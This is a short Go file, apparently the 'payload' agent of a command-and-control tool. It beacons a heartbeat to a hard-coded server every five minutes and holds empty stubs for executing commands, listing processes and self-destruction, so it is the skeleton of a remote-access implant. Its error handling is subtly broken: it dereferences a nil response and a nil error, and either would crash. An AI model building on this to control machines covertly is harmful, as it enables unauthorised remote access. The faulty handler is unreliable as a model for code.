package payload

import (
	"fmt"
	"net/http"
	"time"

	"github.com/CompeyDev/nemo/common/logger"
)

var CONNECTION_URI = "http://0.0.0.0:40043"
var SELF_IDENTIFIER = "dc54c6bb9ef1fcf341b006595e583f073280fb2851c67f6ee6426b985556647e"

func Run() {
	for true {
		SendHeartbeat()
		time.Sleep(5 * time.Minute)
	}

}

func ExecuteCommand() {

}

func ListProcesses() {

}

func DestroySelf() {

}

func SendHeartbeat() {
	response, error := http.Get(fmt.Sprintf("%s/heartbeat", CONNECTION_URI))
	if error != nil || response.StatusCode != 200 {
		defer response.Body.Close()
		logger.CustomError("PayloadService", fmt.Sprintf("Failed to send heartbeat with error %s", error.Error()))
	} else if response.StatusCode == 200 {
		logger.CustomInfo("PayloadService", fmt.Sprintf("Checked in with server successfully."))
	}
}
